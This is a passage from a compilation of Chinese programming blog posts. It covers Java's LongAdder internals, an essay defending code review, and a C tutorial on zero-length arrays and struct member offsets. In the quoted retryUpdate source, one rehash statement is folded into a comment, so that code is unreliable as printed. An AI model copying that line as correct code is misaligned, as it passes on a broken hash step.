看到这里我想应该有很多人明白为什么LongAdder会比AtomicLong更高效了，没错，唯一会制约AtomicLong高效的原因是高并发，高并发意味着CAS的失败几率更高， 重试次数更多，越多线程重试，CAS失败几率又越高，变成恶性循环，AtomicLong效率降低。 那怎么解决？ **LongAdder给了我们一个非常容易想到的解决方案：减少并发，将单一value的更新压力分担到多个value中去，降低单个value的 “热度”，分段更新！！！**

这样，线程数再多也会分担到多个value上去更新，只需要增加value就可以降低 value的 “热度”  AtomicLong中的 恶性循环不就解决了吗？ cells 就是这个 “段” cell中的value 就是存放更新值的， 这样，**当我需要总数时，把cells 中的value都累加一下不就可以了么！！**

**当然，聪明之处远远不仅仅这里，在看看add方法中的代码，casBase方法可不可以不要，直接分段更新,上来就计算 索引位置，然后更新value？**

答案是不好，不是不行，因为，casBase操作等价于AtomicLong中的CAS操作，要知道，LongAdder这样的处理方式是有坏处的，分段操作必然带来空间上的浪费，可以空间换时间，但是，**能不换就不换，看空间时间都节约~！** 所以，**casBase操作保证了在低并发时，不会立即进入分支做分段更新操作**，因为低并发时，casBase操作基本都会成功，只有并发高到一定程度了，才会进入分支，所以，Doug Lea对该类的说明是： **低并发时LongAdder和AtomicLong性能差不多，高并发时LongAdder更高效！**

![la7](http://www.liuinsect.com/wp-content/uploads/2014/04/la7.png)

但是，Doung Lea 还是没这么简单，聪明之处还没有结束……

如此，retryUpdate中做了什么事，也基本略知一二了，因为cell中的value都更新失败(说明该索引到这个cell的线程也很多，并发也很高时) 或者cells数组为空时才会调用retryUpdate,

因此，**retryUpdate里面应该会做两件事：**

1. **扩容，将cells数组扩大**，降低每个cell的并发量，同样，这也意味着cells数组的rehash动作。
2.  **给空的cells变量赋一个新的Cell数组**。

是不是这样呢？ 继续看代码：

代码比较长，变成文本看看，为了方便大家看if else 分支，对应的  { } 我用相同的颜色标注出来。可以看到，这个时候Doug Lea才愿意使用死循环保证更新成功~！

```
  final void retryUpdate(long x, HashCode hc, boolean wasUncontended) {
        int h = hc.code;
        boolean collide = false;                // True if last slot nonempty
        for (;;) {
            Cell[] as; Cell a; int n; long v;
            if ((as = cells) != null && (n = as.length) > 0) {// 分支1
                if ((a = as[(n - 1) & h]) == null) {
                    if (busy == 0) {            // Try to attach new Cell
                        Cell r = new Cell(x);   // Optimistically create
                        if (busy == 0 && casBusy()) {
                            boolean created = false;
                            try {               // Recheck under lock
                                Cell[] rs; int m, j;
                                if ((rs = cells) != null &&
                                        (m = rs.length) > 0 &&
                                        rs[j = (m - 1) & h] == null) {
                                    rs[j] = r;
                                    created = true;
                                }
                            } finally {
                                busy = 0;
                            }
                            if (created)
                                break;
                            continue;           // Slot is now non-empty
                        }
                    }
                    collide = false;
                }
                else if (!wasUncontended)       // CAS already known to fail
                    wasUncontended = true;      // Continue after rehash
                else if (a.cas(v = a.value, fn(v, x)))
                    break;
                else if (n >= NCPU || cells != as)
                    collide = false;            // At max size or stale
                else if (!collide)
                    collide = true;
                else if (busy == 0 && casBusy()) {
                    try {
                        if (cells == as) {      // Expand table unless stale
                            Cell[] rs = new Cell[n << 1];
                            for (int i = 0; i < n; ++i)
                                rs[i] = as[i];
                            cells = rs;
                        }
                    } finally {
                        busy = 0;
                    }
                    collide = false;
                    continue;                   // Retry with expanded table
                }
                h ^= h << 13;                   // Rehash  h ^= h >>> 17;
                h ^= h << 5;
            }
            else if (busy == 0 && cells == as && casBusy()) {//分支2
                boolean init = false;
                try {                           // Initialize table
                    if (cells == as) {
                        Cell[] rs = new Cell[2];
                        rs[h & 1] = new Cell(x);
                        cells = rs;
                        init = true;
                    }
                } finally {
                    busy = 0;
                }
                if (init)
                    break;
            }
            else if (casBase(v = base, fn(v, x)))
                break;                          // Fall back on using base
        }
        hc.code = h;                            // Record index for next time
    }
```

分支2中，为cells为空的情况，需要new 一个Cell数组。

分支1分支中，略复杂一点点：

注意，几个分支中都提到了busy这个方法，这个可以理解为一个CAS实现的锁，只有在需要更新cells数组的时候才会更新该值为1，如果更新失败，则说明当前有线程在更新cells数组，当前线程需要等待。重试。

回到分支1中，这里首先判断当前cells数组中的索引位置的cell元素是否为空，如果为空，则添加一个cell到数组中。

否则更新 标示冲突的标志位wasUncontended 为 true ，重试。

否则，再次更新cell中的value,如果失败，重试。

。。。。。。。一系列的判断后，如果还是失败，下下下策，reHash,直接将cells数组扩容一倍，并更新当前线程的hash值，保证下次更新能尽可能成功。

**可以看到，LongAdder确实用了很多心思减少并发量，并且，每一步都是在”没有更好的办法“的时候才会选择更大开销的操作，从而尽可能的用最最简单的办法去完成操作。追求简单，但是绝对不粗暴。**

———————**陈皓注————————**

最后留给大家思考的两个问题：

1）是不是AtomicLong可以被废了？

2）如果cell被创建后，原来的casBase就不走了，会不会性能更差？

———————liuinsect**注————————**

昨天和左耳朵耗子简单讨论了下，发现左耳朵耗子,耗哥对读者思维的引导还是非常不错的，在第一次发现这个类后，对里面的实现又提出了更多的问题，引导大家思考，值得学习。

我们 发现的问题有这么几个（包括以上的问题），自己简单总结下，欢迎大家讨论：

1. jdk 1.7中是不是有这个类？

我确认后，结果如下：  jdk-7u51 版本上还没有  但是jdk-8u20版本上已经有了。代码基本一样 ，增加了对double类型的支持和删除了一些冗余的代码。有兴趣的同学可以去下载下JDK 1.8看看

2. base有没有参与汇总？

base在调用intValue等方法的时候是会汇总的：

[![LA10](http://www.liuinsect.com/wp-content/uploads/2014/04/LA101.bmp)](http://www.liuinsect.com/wp-content/uploads/2014/04/LA101.bmp)

3. 如果cell被创建后，原来的casBase就不走了，会不会性能更差？ base的顺序可不可以调换?

  刚开始我想可不可以调换add方法中的判断顺序，比如，先做casBase的判断？ 仔细思考后认为还是 不调换可能更好，调换后每次都要CAS一下，在高并发时，失败几率非常高，并且是恶性循环，比起一次判断，后者的开销明显小很多，还没有副作用（上一个问题，base变量在sum时base是会被统计的，并不会丢掉base的值）。因此，不调换可能会更好。

4. AtomicLong可不可以废掉？

我的想法是可以废掉了，因为，虽然LongAdder在空间上占用略大，但是，它的性能已经足以说明一切了,无论是从节约空的角度还是执行效率上，AtomicLong基本没有优势了，具体看这个测试（感谢[Lemon](http://lianming.info/)的回复）:http://blog.palominolabs.com/2014/02/10/java-8-performance-improvements-longadder-vs-atomiclong/



（全文完）

# 从CODE REVIEW 谈如何做技术

#####  [2014年04月12日 ](https://coolshell.cn/articles/11432.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [218 条评论](https://coolshell.cn/articles/11432.html#comments) 205,732 人阅读

![img](photo/code_review-225x300.jpg)（这篇文章缘由我的微博，我想多说一些，有些杂乱，想到哪写到哪）

这两天，在微博上表达了一下Code Review的重要性。因为翻看了阿里内部的Review Board上的记录，从上面发现Code Review做得好的是一些比较偏技术的团队，而偏业务的技术团队基本上没有看到Code Review的记录。当然，这并不能说没有记录他们就没有做Code Review，于是，我就问了一下以前在业务团队做过的同事有没有Code Review，他告诉我不但没有Code Review，而且他认为Code Review没用，因为：

1）工期压得太紧，时间连coding都不够，以上线为目的，

2）需求老变，代码的生命周期太短。所以，写好的代码没有任何意义，烂就烂吧，反正与绩效无关。

我心里非常不认同这样的观点，我觉得我是程序员，我是工程师，就像医生一样，不是把病人医好就好了，还要对病人的长期健康负责。对于常见病，要很快地医好病人很简单，下猛药，大量使用抗生素，好得飞快。但大家都知道，这明显是“饮鸩止渴”、“竭泽而渔”的做法。医生需要有责任心和医德，我也觉得程序员工程师也要有相应的责任心和相应的修养。东西交给我我必需要负责，我觉得这种负责和修养不是”做出来“就了事了，而是要到“做漂亮”这个级别，这就是“山寨”和“工业”的差别。而只以“做出来”为目的标准，我只能以为，这样的做法只不过是“按部就班”的堆砌代码罢了，和劳动密集型的“装配生产线”和“砌砖头”没有什么差别，在这种环境里呆着还不如离开。

老实说，因为去年我在业务团队的时候，我的团队也没有做Code Review，原因是多样的。其中一个重要原因是，我刚来阿里，所以，需要做的是在适应阿里的文化，任何公司都有自己的风格和特点，任何公司的做法都有他的理由和成因，对于我这样的一个初来者，首要的是要适应和观察，不要对团队做太多的改动，跟从、理解和信任是融入的关键。（注：在建北京团队和不要专职的测试人员上我都受到了一些阻力），所以跟着团队走没有玩Code Review。干了一年后，觉得我妥协了很多我以前所坚持的东西，觉得自己的标准在降低，想一想后背拔凉拔凉的，所以我决定坚持，而且还要坚持高标准。



对于Code Review很重要的这个观点，在微博上抛出来后，被一些阿里的工程师，架构师/专家，甚至资深架构师批评，我在和他们回复和讨论的过程中，居然发现有个“因为对方用户的设置”我无法回复了（我被拉黑了，还有一些直接就是冷讽和骂人了，微博中我就直接删除了）。这些批评我的阿里工程师/架构师的观点总结一下如下：（**顺便说一下，阿里内还是有很多团队坚持做Code Review的**）

1）到业务团队体会一下，倒逼工期的项目有多少？订好交付日期后再要求提前1个月的有多少？现在是做到已经不容易，更不谈做得漂亮！。

2）Code Review是一种教条，意义不大，有测试，只要不出错，就可以了。

3）目标都是改进质量，有限的投入总希望能有最大的产出，不同沉湎改进质量的方式不一样，业务应用开发忙的跟狗一样，而且业务逻辑变化快，通用性差，codereviw的成本要比底层高。

4）现在的主要矛盾是倒排出来的工期和不靠谱的程序员之间的矛盾，我认为cr不是解决这个问题的银弹。不从实际情况出发光打正义的嘴炮实在太过于自慰了 。

**我们可以看到，上面观点其实和Code Review没有太多关系，其实是在抱怨另外的问题**。这些观点其实是技术团队和业务团队的矛盾，但不知道为什么强加给了我的“Code Review很重要”的这个观点，然后这些观点反过来冲击“Code Reivew”，并说“Code Review无用”。这种讨论问题的方式在很常见，你说A，我说B，本来A、B是两件事，但就是要混为一谈，然后似是而非的用B来证明你的A观点是错的。（也许，这些工程师/架构师心存怨气，需要一个发泄的通道）

**我觉得，很多时候，人思考问题思考不清楚，很大一部分原因是因为把很多问题混为一谈**，连我自己有些时候都会这样。引以为戒。

即然被混为一谈，那我就来拆分一下，也是下面这三个问题：

- Code Review有没有用的问题。
- Code Review做不起来的问题。
- 业务变化快，速度快的问题，技术疲于跟命。

目录



[Code Review](https://coolshell.cn/articles/11432.html#Code_Review)[Code Review 的问题](https://coolshell.cn/articles/11432.html#Code_Review_的问题)[被业务逼得太紧](https://coolshell.cn/articles/11432.html#被业务逼得太紧)[其它](https://coolshell.cn/articles/11432.html#其它)

#### Code Review

你Google一下Code Reivew这个关键词，你就会发现Code Review的好处基本上是不存在争议的，有很多很多的文章和博文都在说Code Review的重要性，怎么做会更好，而且很多公司在面试过程中会加入“Code Review”的问题。打开[Wikipedia的词条](https://zh.wikipedia.org/wiki/代码审查)你会看到这样的描述——

> 卡珀斯·琼斯（Capers Jones）分析了超过12,000个软件开发项目，其中使用正式代码审查的项目，发现潜在缺陷率约在60-65%之间，若是非正式的代码审查，发现潜在缺陷率不到50%。大部份的测试，发现的潜在缺陷率会在30%左右。
>
> 对于一些关键的软件（例如安全关键系统的嵌入式软件），一般的代码审查速度约是一小时150行程序码，一小时审查数百行程序码的审查速度太快，可能无法找到程序中的问题。代码审查一般可以找到及移除约65%的错误，最高可以到85%。
>
> 也有研究针对代码审查找到的缺陷类型进行分析。代码审查找到的缺陷中，有75%是和计算机安全隐患有关。对于产品生命周期很长的软件公司而言，代码审查是很有效的工具。

**Code Review的好处我觉得不用多说了，主要是让你的代码可以更好的组织起来，有更易读，有更高的维护性，同时可以达到知识共享，找到bug只是其中的副产品**。这个东西已经不新鲜了，你上网可以找到很多文章，我就不多说了。就像你写程序要判断错误一样，Code Review也是最基本的常识性的东西。

我从2002年开始就浸泡在严格的Code Review中，我的个人成长和Code Review有很大的关系，如果我的成长过程中没有经历过Code Review这个事，我完全不敢想像。

**我个人认为代码有这几种级别：1）可编译，2）可运行，3）可测试，4）可读，5）可维护，6）可重用。通过自动化测试的代码只能达到第3）级，而通过Code Review的代码少会在第4）级甚至更高。**关于Code Review，你可以参看本站的《[Code Review中的几个提示](https://coolshell.cn/articles/1302.html)》

可见，Code Review直接关系到了你的工程能力！

#### Code Review 的问题

有下面几个情况会让你的Code Review没有效果。

首当其冲的是——“**人员能力不足**”，我经历过这样的情况，Code Review的过程中，大家大眼瞪小眼，没有什么好的想法，不知道什么是好的代码，什么是不好的代码。导致Code Review大多数都在代码风格上。今天，我告诉你，代码风格这种事，是每个程序员自查的事情，不应该浪费大家的时间。对此，我有两个建议：1）你团队的人招错了，该换血了。2）让你团队的人花时候阅读一下《[代码大全](http://book.douban.com/subject/1477390/)》这本书（当然，还要读很多基础知识的书）。

次当其冲的是——“**结果更重要**”，也就是说，做出来更重要，做漂亮不重要。因为我的KPI和年终奖based on how many works I’ve done！而不是How perfect they are ! 这让我想到那些天天在用Spring MVC 做CRUD网页的工程师，我承认，他们很熟练。大量的重复劳动。其实，仔细想一下好多东西是可以框架化，模板化，或是自动生成的。所以，为了堆出这么多网页就停地去堆，做的东西是很多，但是没有任何成长。急功近利，也许，你做得多，拿到了不错的年终奖，但是你失去的也多，失去了成为一个卓越工程师的机会。你本来可以让你的月薪在1-2年后翻1-2倍的，但一年后你只拿到了为数不多的年终奖。

然后是——“**人员的态度问题**”，一方面就是懒，不想精益求精，只要干完活交差了事。对此，你更要大力开展Code Review了，让这种人写出来的代码曝光在更多人面前，让他为质量不好的代码蒙羞。另一方面，有人会觉得那是别人的模块，我不懂，也没时间 去懂，不懂他的业务怎么做Code Review? 我只想说，如果你的团队里这样的“各个自扫门前雪”的事越多，那么这个团队也就越没主动性，没有主动性也就越不可能是个好团队，做的东西也不可能好。而对于个人来说，也就越不可能有成长。

接下来是——“**需求变化的问题**”，有人认识，需求变得快，代码的生存周期比较短，不需要好的代码，反正过两天这些代码就会被废弃了。如果是一次性的东西，的确质量不需要太高，反正用了就扔。但是，我觉得多多少少要Review一下这个一次性的烂代码不会影响那些长期在用的代码吧，如果你的项目全部都是临时代码，那么你团队是不是也是一个临时团队？关于如果应对需求变化，你可以看看本站的《[需求变化与IoC](https://coolshell.cn/articles/6950.html)》《[Unix的设计思想来应对多变的需求](https://coolshell.cn/articles/7236.html)》的文章 ，从这些文章中，我相信你可以看到对于需求变化的代码质量需要的更高。

最后是——“**时间不够问题**”，如果是业务逼得紧，让你疲于奔命，那么这不是Code Review好不好问题，这是需求管理和项目管理的问题以及别的非技术的问题。下面我会说。

不管怎么样，上述Code Review的问题不应该成为“Code Review无意义”的理由或借口，这就好像“因噎废食”一样。干什么事都会有困难和问题的，有的人就这样退缩了，但有的人看得到利大于弊，还是去坚持，人与人的不同正在这个地方。这就是为什么运动会受伤，但还是会人去运动，而有人因为怕受伤就退缩了一样。

#### 被业务逼得太紧

被业务逼得太紧，需求乱变，这其实和Code Review没有多大关系了。对此，我想先讲一个我的故事。

我去年在阿里的聚石塔，刚去的时候，聚石塔正在做一个很大的重构——对架构的大调整。因此压了很多业务需求，等这个项目花了2-3个月做完了后，一下子涌入了30-50个需求，还规定一个月完成，搞得团队疲于奔命。在累了两周后，我仔细分析了一下这些需求，发现很多需求是在重复做阿里云已经做过的东西，还有一些需求是因为聚石塔这个平台不规范没有标准所产生的问题。于是，我做了这么三件事：

1）重新定义聚石塔这个产品主要目标和范围，确定哪些该做，哪些不该做。

2）为聚石塔制定标准 ，让阿里云的API都长得基本一样，并制订云资源的接入标准。

3）推动重构阿里云的Portal系统，不再实现阿里云已经做过的东西，与阿里云紧密结合。

这些事情推动起来并不容易，聚石塔的业务方一开始也不理解，我和产品一起做业务方的工作，而阿里云也被我逼得很惨（在这里一并感谢，尤其阿里云的同学，老实说，和阿里云跨团队合作中是我这么多年来感觉最好的一次，相当赞）。通过这个事，聚石塔需求一下就有质的下降了。搞得还有几个工程师来和我说，你这么搞，聚石塔就没事可干了。姑且不说工程师对聚石塔的理解是怎么样的。 我只想说，我大量地减少了需求，尽最大可能联合了该联合的人，而不是自己闭门造车，并让产品的目标和方向更明确了。做了这些事情后，大家不但不用加班，而且还有时间充电去学技术，并为聚石塔思考未来的方向和发展。去年公司996的时候，我的团队还在965（搞得跟异教徒似的），而且还有很多时间去专研新的东西。

说这个故事，我不是为了得瑟，而是因为有些人在微博上抨击我是一个道貌岸然的只会谈概念讲道理的装逼犯。所以，我告诉大家我在聚石塔是怎么做的，我公开写在这里，你也可以向相关的同学去求证我说的是不是真的。也向你证明，我可能是个装逼犯，但绝不是只会谈概念讲道理的装逼犯。

被业务方逼得紧不要抱怨，你没有时间被逼得像牲口一样工作，这个时候，你需要的是暂停一下想一想，为什么会像牲口一样？而这正是让你变得聪明的机会。

我为你总结一下，

1）你有没有去Review业务部门给你的这么多的需求，哪些是合理的，哪些是不合理的。在Amazon，开发工程师都会被教育拿到需求后一定要问——“为什么要做？业务影响度有多大？有多少用户受益？”，回答不清这个问题，没有数据的支持，就不做。所以，产品经理要做很多数据挖拙和用户调研的工作，而不是拍拍脑袋，听极少数的用户抱怨就要开需求了。

2）产品经理也要管理和教育的。你要告诉你的产品经理：“你是一个好的产品经理，因为你不但对用户把握得很好，也会对软件工艺把握得很好。你不但会开出外在的功能性需求，也同样会开出内在的让软件系统更完善的非功能性需求。你不是在迁就用户，而是引导用户。你不会无限制地加功能，而是把握产品灵魂控制并简化功能。你会为自己要做的和不做东西的感到同样的自豪。”你要告诉你的产品经理：“做一个半成品不如做好半年产品”（更多这样的观点请参看《[Rework摘录和感想](https://coolshell.cn/articles/9156.html)》）

3）做事情是要讲效率的。Amazon里喜欢使用一种叫T-Shirt Size Estimation的评估方法来优先做投入小产出大的“Happy Case”。关于什么是效率，什么是T-Shirt Size Estimation，你可以看看《[加班与效率](https://coolshell.cn/articles/10217.html)》一文 。

4）需求总是会变化的，不要抱怨需求变化太快。你应该抱怨的是为什么我们没有把握好方向？老变？这个事就像踢足球一样，你要去的地方是球将要去的地方，而不是球现在的地方。你要知道球要去哪里，你就知道球之前是怎么动的，找到了运动轨迹后，你才知道球要去像何方。如果你都不知道球要去向何方，那你就是一只无头苍蝇一样，东一下西一下。

**当你忙得跟牲口一样，你应该停下来，问一下自己，自己成为牲口的原因，是不是就是因为自己做事时候像就牲口一样思考？**

#### 其它

最后，我在给阿里今年新入职的毕业生的“技塑人生”的分享中，我给他们布置了5、6个Homework，分享几个给大家：

1）重构或写一个模块，把他做成真正的Elegant级别。

2）与大家分享一篇或几篇技术文章 ，并收获10-30个赞。

3）降低现有至少20%的重复工作或维护工作

4）拒绝或简化一个需求（需要项目中所有的Stakeholders都同意）

部署这些作业的原因，是我希望新入行的同学们对自己的工作坚持高的标准，我知道你们会因为骨感的现实而妥协，但是我希望你们就算在现实中妥协了也要在内心中坚持尽可能高的标准，不要习惯成自然，最后被社会这个大染缸给潜移默化了。因为你至少要对自己负责。**对自己负责就是，用脚投票，如果妥协得受不了了就离开吧**。

芝兰生于空谷，不以无人而不芳！君子修身养道，不以穷困而改志！

谢谢听我唠叨。

（全文完）

# C语言结构体里的成员数组和指针

#####  [2014年04月01日 ](https://coolshell.cn/articles/11377.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [195 条评论](https://coolshell.cn/articles/11377.html#comments) 146,914 人阅读

单看这文章的标题，你可能会觉得好像没什么意思。你先别下这个结论，相信这篇文章会对你理解C语言有帮助。这篇文章产生的背景是在微博上，看到[@Laruence](http://weibo.com/laruence)同学出了一个关于C语言的题，[微博链接](http://weibo.com/1170999921/ADojDbuSe)。微博截图如下。我觉得好多人对这段代码的理解还不够深入，所以写下了这篇文章。

[![zero_array](photo/zero_array.png)](http://weibo.com/1170999921/ADojDbuSe)

为了方便你把代码copy过去编译和调试，我把代码列在下面：

```
#include <stdio.h>
struct str{
    int len;
    char s[0];
};

struct foo {
    struct str *a;
};

int main(int argc, char** argv) {
    struct foo f={0};
    if (f.a->s) {
        printf( f.a->s);
    }
    return 0;
}
```

你编译一下上面的代码，在VC++和GCC下都会在14行的printf处crash掉你的程序。[@Laruence](http://weibo.com/laruence) 说这个是个经典的坑，我觉得这怎么会是经典的坑呢？上面这代码，你一定会问，为什么if语句判断的不是f.a？而是f.a里面的数组？写这样代码的人脑子里在想什么？还是用这样的代码来玩票？不管怎么样，看过原微博的回复，我个人觉得大家主要还是对C语言理解不深，如果这算坑的话，那么全都是坑。



接下来，你调试一下，或是你把14行的printf语句改成：

```
printf("%x\n", f.a->s);
```

你会看到程序不crash了。程序输出：4。 这下你知道了，访问0x4的内存地址，不crash才怪。于是，你一定会有如下的问题：

**1）为什么不是 13行if语句出错？f.a被初始化为空了嘛，用空指针访问成员变量为什么不crash？**

**2）为什么会访问到了0x4的地址？靠，4是怎么出来的？**

**3）代码中的第4行，char s[0] 是个什么东西？零长度的数组？为什么要这样玩？**

让我们从基础开始一点一点地来解释C语言中这些诡异的问题。

目录



[结构体中的成员](https://coolshell.cn/articles/11377.html#结构体中的成员)[指针和数组的差别](https://coolshell.cn/articles/11377.html#指针和数组的差别)[关于零长度的数组](https://coolshell.cn/articles/11377.html#关于零长度的数组)[后记](https://coolshell.cn/articles/11377.html#后记)

#### 结构体中的成员

首先，我们需要知道——**所谓变量，其实是内存地址的一个抽像名字罢了**。在静态编译的程序中，所有的变量名都会在编译时被转成内存地址。机器是不知道我们取的名字的，只知道地址。

所以有了——栈内存区，堆内存区，静态内存区，常量内存区，我们代码中的所有变量都会被编译器预先放到这些内存区中。

有了上面这个基础，我们来看一下结构体中的成员的地址是什么？我们先简单化一下代码：

```
struct test{
    int i;
    char *p;
};
```

上面代码中，test结构中i和p指针，在C的编译器中保存的是相对地址——也就是说，他们的地址是相对于struct test的实例的。如果我们有这样的代码：

```
struct test t;
```

我们用gdb跟进去，对于实例t，我们可以看到：

```
# t实例中的p就是一个野指针
(gdb) p t
$1 = {i = 0, c = 0 '\000', d = 0 '\000', p = 0x4003e0 "1\355I\211\..."}

# 输出t的地址
(gdb) p &t
$2 = (struct test *) 0x7fffffffe5f0

#输出(t.i)的地址
(gdb) p &(t.i)
$3 = (char **) 0x7fffffffe5f0

#输出(t.p)的地址
(gdb) p &(t.p)
$4 = (char **) 0x7fffffffe5f4
```

我们可以看到，t.i的地址和t的地址是一样的，t.p的址址相对于t的地址多了个4。说白了，**t.i 其实就是(&t + 0x0)**, **t.p 的其实就是 (&t + 0x4)**。0x0和0x4这个偏移地址就是成员i和p在编译时就被编译器给hard code了的地址。于是，你就知道，**不管结构体的实例是什么——访问其成员其实就是加成员的偏移量**。

下面我们来做个实验：

```
struct test{
    int i;
    short c;
    char *p;
};

int main(){
    struct test *pt=NULL;
    return 0;
}
```

编译后，我们用gdb调试一下，当初始化pt后，我们看看如下的调试：（我们可以看到就算是pt为NULL，访问其中的成员时，其实就是在访问相对于pt的内址）

```
(gdb) p pt
$1 = (struct test *) 0x0
(gdb) p pt->i
Cannot access memory at address 0x0
(gdb) p pt->c
Cannot access memory at address 0x4
(gdb) p pt->p
Cannot access memory at address 0x8
```

注意：上面的pt->p的偏移之所以是0x8而不是0x6，是因为内存对齐了（我在64位系统上）。关于内存对齐，可参看《[深入理解C语言](https://coolshell.cn/articles/5761.html)》一文。

好了，现在你知道为什么原题中会访问到了0x4的地址了吧，因为是相对地址。

相对地址有很好多处，其可以玩出一些有意思的编程技巧，比如把C搞出面向对象式的感觉来，你可以参看我正好11年前的文章《[用C写面向对像的程序](http://blog.csdn.net/haoel/article/details/2864)》（用指针类型强转的危险玩法——相对于C++来说，C++编译器帮你管了继承和虚函数表，语义也清楚了很多）

#### 指针和数组的差别

有了上面的基础后，你把源代码中的struct str结构体中的char s[0];改成char *s;试试看，你会发现，在13行if条件的时候，程序因为Cannot access memory就直接挂掉了。为什么声明成char s[0]，程序会在14行挂掉，而声明成char *s，程序会在13行挂掉呢？**那么char \*s 和 char s[0]有什么差别呢**？

在说明这个事之前，有必要看一下汇编代码，用GDB查看后发现：

- 对于char s[0]来说，汇编代码用了lea指令，lea  0x04(%rax),  %rdx
- 对于char*s来说，汇编代码用了mov指令，mov 0x04(%rax),  %rdx

lea全称load effective address，是把地址放进去，而mov则是把地址里的内容放进去。所以，就crash了。

从这里，我们可以看到，**访问成员数组名其实得到的是数组的相对地址，而访问成员指针其实是相对地址里的内容**（这和访问其它非指针或数组的变量是一样的）

换句话说，**对于数组 char s[10]来说，数组名 s 和 &s 都是一样的**（不信你可以自己写个程序试试）。在我们这个例子中，也就是说，都表示了偏移后的地址。这样，如果我们访问 指针的地址（或是成员变量的地址），那么也就不会让程序挂掉了。

正如下面的代码，可以运行一点也不会crash掉（你汇编一下你会看到用的都是lea指令）：

```
struct test{
    int i;
    short c;
    char *p;
    char s[10];
};

int main(){
    struct test *pt=NULL;
    printf("&s = %x\n", pt->s); //等价于 printf("%x\n", &(pt->s) );
    printf("&i = %x\n", &pt->i); //因为操作符优先级，我没有写成&(pt->i)
    printf("&c = %x\n", &pt->c);
    printf("&p = %x\n", &pt->p);
    return 0;
}
```

**看到这里，你觉得这能算坑吗？不要出什么事都去怪语言，大家要想想是不是问题出在自己身上。**

#### 关于零长度的数组

首先，我们要知道，**0长度的数组在ISO C和C++的规格说明书中是不允许的**。这也就是为什么在VC++2012下编译你会得到一个警告：“arning C4200: 使用了非标准扩展 : 结构/联合中的零大小数组”。

那么为什么gcc可以通过而连一个警告都没有？那是因为gcc 为了预先支持C99的这种玩法，所以，让“零长度数组”这种玩法合法了。关于GCC对于这个事的文档在这里：“[Arrays of Length Zero](http://gcc.gnu.org/onlinedocs/gcc/Zero-Length.html)”，文档中给了一个例子（我改了一下，改成可以运行的了）：

```
#include <stdlib.h>
#include <string.h>

struct line {
   int length;
   char contents[0]; // C99的玩法是：char contents[]; 没有指定数组长度
};

int main(){
    int this_length=10;
    struct line *thisline = (struct line *)
                     malloc (sizeof (struct line) + this_length);
    thisline->length = this_length;
    memset(thisline->contents, 'a', this_length);
    return 0;
}
```

上面这段代码的意思是：我想分配一个不定长的数组，于是我有一个结构体，其中有两个成员，一个是length，代表数组的长度，一个是contents，代码数组的内容。后面代码里的 this_length（长度是10）代表是我想分配的数据的长度。（这看上去是不是像一个C++的类？）这种玩法英文叫：Flexible Array，中文翻译叫：柔性数组。

我们来用gdb看一下：

```
(gdb) p thisline
$1 = (struct line *) 0x601010

(gdb) p *thisline
$2 = {length = 10, contents = 0x601010 "\n"}

(gdb) p thisline->contents
$3 = 0x601014 "aaaaaaaaaa"
```

我们可以看到：在输出*thisline时，我们发现其中的成员变量contents的地址居然和thisline是一样的（偏移量为0x0??!!）。但是当我们输出thisline->contents的时候，你又发现contents的地址是被offset了0x4了的，内容也变成了10个‘a’。（我觉得这是一个GDB的bug，VC++的调试器就能很好的显示）

我们继续，如果你sizeof(char[0])或是 sizeof(int[0]) 之类的零长度数组，你会发现sizeof返回了0，这就是说，零长度的数组是存在于结构体内的，但是不占结构体的size。你可以简单的理解为一个没有内容的占位标识，直到我们给结构体分配了内存，这个占位标识才变成了一个有长度的数组。

看到这里，你会说，为什么要这样搞啊，把contents声明成一个指针，然后为它再分配一下内存不行么？就像下面一样。

```
struct line {
   int length;
   char *contents;
};

int main(){
    int this_length=10;
    struct line *thisline = (struct line *)malloc (sizeof (struct line));
    thisline->contents = (char*) malloc( sizeof(char) * this_length );
    thisline->length = this_length;
    memset(thisline->contents, 'a', this_length);
    return 0;
}
```

这不一样清楚吗？而且也没什么怪异难懂的东西。是的，这也是普遍的编程方式，代码是很清晰，也让人很容易理解。即然这样，那为什么要搞一个零长度的数组？有毛意义？！

这个事情出来的原因是——**我们想给一个结构体内的数据分配一个连续的内存！**这样做的意义有两个好处：

**第一个意义是，方便内存释放**。如果我们的代码是在一个给别人用的函数中，你在里面做了二次内存分配，并把整个结构体返回给用户。用户调用free可以释放结构体，但是用户并不知道这个结构体内的成员也需要free，所以你不能指望用户来发现这个事。所以，如果我们把结构体的内存以及其成员要的内存一次性分配好了，并返回给用户一个结构体指针，用户做一次free就可以把所有的内存也给释放掉。（读到这里，你一定会觉得C++的封闭中的析构函数会让这事容易和干净很多）

**第二个原因是，这样有利于访问速度**。连续的内存有益于提高访问速度，也有益于减少内存碎片。（其实，我个人觉得也没多高了，反正你跑不了要用做偏移量的加法来寻址）

我们来看看是怎么个连续的，用gdb的x命令来查看：(我们知道，用struct line {}中的那个char contents[]不占用结构体的内存，所以，struct line就只有一个int成员，4个字节，而我们还要为contents[]分配10个字节长度，所以，一共是14个字节)

```
(gdb) x /14b thisline
0x601010:       10      0       0       0       97      97      97      97
0x601018:       97      97      97      97      97      97
```

从上面的内存布局我们可以看到，前4个字节是 int length，后10个字节就是char contents[]。

如果用指针的话，会变成这个样子：

```
(gdb) x /16b thisline
0x601010:       1       0       0       0       0       0       0       0
0x601018:       32      16      96      0       0       0       0       0
(gdb) x /10b this->contents
0x601020:       97      97      97      97      97      97      97      97
0x601028:       97      97
```

上面一共输出了四行内存，其中，

- 第一行前四个字节是 int length，第一行的后四个字节是对齐。
- 第二行是char* contents，64位系统指针8个长度，他的值是0x20 0x10 0x60 也就是0x601020。
- 第三行和第四行是char* contents指向的内容。

从这里，我们看到，**其中的差别——数组的原地就是内容，而指针的那里保存的是内容的地址**。

#### 后记

好了，我的文章到这里就结束了。但是，请允许我再唠叨两句。

**1）看过这篇文章，你觉得C复杂吗？我觉得并不简单。某些地方的复杂程度不亚于C++。**

**2）那些学不好C++的人一定是连C都学不好的人。连C都没学好，你们根本没有资格鄙视C++。**

**3）当你们在说有坑的时候，你得问一下自己，是真有坑还是自己的学习能力上出了问题。**

如果你觉得你的C语言还不错，欢迎你看看《[C语言的谜题](https://coolshell.cn/articles/945.html)》还有《[谁说C语言很简单？](https://coolshell.cn/articles/873.html)》还有《[语言的歧义](https://coolshell.cn/articles/830.html)》以及《[深入理解C语言](https://coolshell.cn/articles/5761.html)》一文。

（全文完）

# 无插件VIM编程技巧

